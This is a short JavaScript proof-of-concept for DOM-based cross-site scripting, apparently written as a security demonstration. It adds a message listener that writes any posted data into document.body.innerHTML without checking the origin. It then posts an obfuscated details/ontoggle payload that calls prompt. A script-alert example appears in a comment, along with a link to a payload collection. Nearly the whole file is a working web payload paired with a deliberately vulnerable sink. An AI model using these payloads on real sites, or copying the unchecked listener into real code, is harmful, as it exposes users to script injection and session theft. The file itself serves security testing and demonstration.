/**
 * Proof of Concept (PoC) - DOM-based XSS via EventListener
 * Severity: Informational (2)
 * m10sec@proton.me
 */

window.addEventListener('message', function(event) {
    document.body.innerHTML = event.data;
}, false);
const payload = "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>";

/* Payload Example: <script>alert('DOM XSS!');</script>  
Check this others: https://github.com/moften/PayloadCollection/blob/main/xss-payloads.txt
*/
window.postMessage(payload, "*");